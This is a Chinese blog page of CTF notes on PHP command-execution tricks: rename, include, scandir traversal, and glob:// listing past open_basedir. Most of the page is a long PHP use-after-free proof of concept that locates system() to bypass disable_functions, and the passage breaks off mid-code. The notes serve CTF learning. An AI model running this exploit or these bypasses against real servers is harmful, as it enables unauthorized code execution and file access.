@@ -1,0 +1,445 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="前言最近又做了些命令执行的题目，这篇文章是对(1)的补充 rename函数在没有禁用rename函数的前提下可以将网站目录下的php文件更名为txt文件进行直接访问 rename(‘flag.php’,’1.txt’); include变量输出include函数将想要查看的php文件包含进来，使用var_dump(get_defined_vars());查看定义的变量内容 include(‘fla">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行知识整理(2)">
+<meta property="og:url" content="http://example.com/2021/10/13/test5/index.html">
+<meta property="og:site_name" content="LY&#39;s blog">
+<meta property="og:description" content="前言最近又做了些命令执行的题目，这篇文章是对(1)的补充 rename函数在没有禁用rename函数的前提下可以将网站目录下的php文件更名为txt文件进行直接访问 rename(‘flag.php’,’1.txt’); include变量输出include函数将想要查看的php文件包含进来，使用var_dump(get_defined_vars());查看定义的变量内容 include(‘fla">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/test5img/1.png">
+<meta property="article:published_time" content="2021-10-13T01:11:02.000Z">
+<meta property="article:modified_time" content="2021-10-13T03:56:12.361Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/test5img/1.png">
+  
+  <title>命令执行知识整理(2) - LY&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>LY&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="命令执行知识整理(2)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-13 09:11" pubdate>
+        October 13, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">命令执行知识整理(2)</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近又做了些命令执行的题目，这篇文章是对(1)的补充</p>
+<h2 id="rename函数"><a href="#rename函数" class="headerlink" title="rename函数"></a>rename函数</h2><p>在没有禁用rename函数的前提下可以将网站目录下的php文件更名为txt文件进行直接访问</p>
+<p>rename(‘flag.php’,’1.txt’);</p>
+<h2 id="include变量输出"><a href="#include变量输出" class="headerlink" title="include变量输出"></a>include变量输出</h2><p>include函数将想要查看的php文件包含进来，使用var_dump(get_defined_vars());查看定义的变量内容</p>
+<p>include(‘flag.php’);var_dump(get_defined_vars());</p>
+<h2 id="scandir函数查看目录"><a href="#scandir函数查看目录" class="headerlink" title="scandir函数查看目录"></a>scandir函数查看目录</h2><p>var_dump(scandir(‘.’));可以查看当前目录名，在没有过滤的情况下也可以配合../进行目录穿越操作</p>
+<h2 id="glob伪协议"><a href="#glob伪协议" class="headerlink" title="glob伪协议"></a>glob伪协议</h2><p>当访问目录被open_basedir限制时可以使用glob伪协议进行访问</p>
+<p><img src="/test5img/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>open_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，<br>假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的<br>用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是<br>可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;glob:///*.txt&quot;</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-comment">//opendir() 函数:打开目录句柄。</span><br><span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) ！== <span class="hljs-literal">false</span> ) &#123;<br>    <span class="hljs-comment">//readdir（）函数返回目录中下一个文件的文件名。</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>closedir(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个代码的作用可以列出根目录下所有txt后缀的文件，而不受open_basedir的限制</p>
+<h2 id="open-basedir绕过poc"><a href="#open-basedir绕过poc" class="headerlink" title="open_basedir绕过poc"></a>open_basedir绕过poc</h2><p>针对open_basedir在访问文件时有大佬写过专用的poc，直接修改使用即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(<span 